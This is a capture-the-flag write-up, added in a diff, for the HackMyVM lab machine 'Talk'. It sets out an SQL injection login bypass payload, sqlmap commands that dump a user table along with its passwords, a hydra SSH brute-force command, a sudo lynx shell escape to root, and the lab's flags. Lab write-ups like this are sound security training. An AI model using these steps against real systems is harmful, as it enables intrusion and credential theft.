@@ -1,0 +1,97 @@
+🟢 Executive Summary
+Severity: High
+Description:
+Initial access was gained through a basic SQL Injection on the login page, which granted panel access. Using Burp Suite and sqlmap, a full dump of the database was extracted, including usernames and passwords. Valid SSH credentials were discovered, and access was obtained as the user nona. Privilege escalation was achieved through sudo permissions on the lynx binary, allowing shell escape to root and full system compromise.
+
+🖥️ Scope and Environment
+Platform: HackMyVM
+Machine: Talk
+Assigned IP: 192.168.1.132
+Date of Analysis: 02/08/2025
+
+🛠 Tools Used
+
+nmap
+
+Burp Suite
+
+sqlmap
+
+hydra
+
+ssh
+
+lynx
+
+🔍 Finding Description
+
+4.1 Port Scanning
+
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.132  
+nmap -sCV -p<PORTS> 192.168.1.132  
+Identified Port:
+
+80/tcp – Web application login interface
+
+4.2 SQL Injection for Initial Access
+
+Manual SQLi tested:
+
+Username: ' OR 1=1-- -  
+Password: ' OR 1=1-- -  
+Successful login granted access to a chat panel. No sensitive information was directly visible, but the SQLi indicated possible further exploitation.
+
+4.3 SQLMap for Database Dump
+
+Captured login request with Burp Suite, saved as request.txt, and used with sqlmap:
+
+sqlmap -r request.txt --dbs --batch  
+sqlmap -r request.txt --dbs --batch -D chat --threads 10 --tables  
+sqlmap -r request.txt --dbs --batch -D chat -T user --dump  
+Extracted credentials from the chat.user table:
+
+username	password
+david	adrianthebest
+jerry	thatsmynonapass
+nona	myfriendtom
+pao	pao
+tina	davidwhatpass
+
+4.4 SSH Brute Force with Extracted Credentials
+
+Credential files created:
+users.txt: david, jerry, nona, pao, tina
+pass.txt: adrianthebest, thatsmynonapass, myfriendtom, pao, davidwhatpass
+
+Hydra used to test:
+
+hydra -L users.txt -P pass.txt ssh://192.168.1.132 -t 64 -I  
+
+Successful access as user: nona
+Password: thatsmynonapass
+
+ssh nona@192.168.1.132  
+
+4.5 Privilege Escalation via Lynx
+
+Check sudo permissions:
+
+sudo -l  
+Result:
+
+(ALL : ALL) NOPASSWD: /usr/bin/lynx
+Executed lynx and escaped to shell using Shift + !:
+
+sudo lynx  
+[Shift + !]
+whoami  
+root  
+Root shell obtained.
+
+🏁 Flags Obtained
+
+user.txt
+wordsarelies
+
+root.txt
+talktomeroot
